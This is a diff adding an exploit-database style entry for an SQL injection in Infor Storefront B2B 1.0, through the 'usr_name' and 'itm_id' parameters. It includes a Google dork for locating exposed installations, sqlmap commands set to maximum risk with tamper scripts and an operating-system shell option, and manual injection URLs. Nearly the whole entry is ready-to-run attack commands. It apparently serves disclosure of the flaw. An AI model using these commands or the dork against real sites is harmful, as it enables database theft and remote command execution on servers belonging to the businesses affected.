@@ -1,0 +1,37 @@
+# Exploit Title: Infor Storefront B2B 1.0 - 'usr_name' SQL Injection
+# Google Dork: inurl:storefrontb2bweb
+# Date: 2020-06-27
+# Exploit Author: ratboy
+# Vendor Homepage: https://www.insitesoft.com/infor-storefront/
+# Version: Infor Storefront
+# Tested on: Windows All Versions
+
+[POC Multiple Vulns]
+
+python sqlmap.py -u
+"http://localhost/storefrontB2BWEB/login.do?setup_principal=true&action=prepare_forgot&login=true&usr_name=ass"
+-p usr_name --dbms=mssql --level=5 --risk=3
+--tamper=between,space2comment -o --random-agent --parse-errors
+--os-shell --technique=ES
+
+
+python sqlmap.py -u
+"http://localhost/storefrontB2CWEB/cart.do?action=cart_add&itm_id=1"
+-p itm_id --dbms=mssql --level=5 --risk=3
+--tamper=between,space2comment -o --random-agent --parse-errors
+--os-shell --technique=ES
+
+
+or...
+
+http://localhost/storefrontB2BWEB/login.do?setup_principal=true&action=prepare_forgot&login=true&usr_name=ass'[SQL
+INJECTION];--
+
+http://localhost/storefrontB2CWEB/cart.do?action=cart_add&itm_id=1'[SQL
+INJECTION];--
+
+
+
+-- 
+Sincerly,
+Aaron Schrom
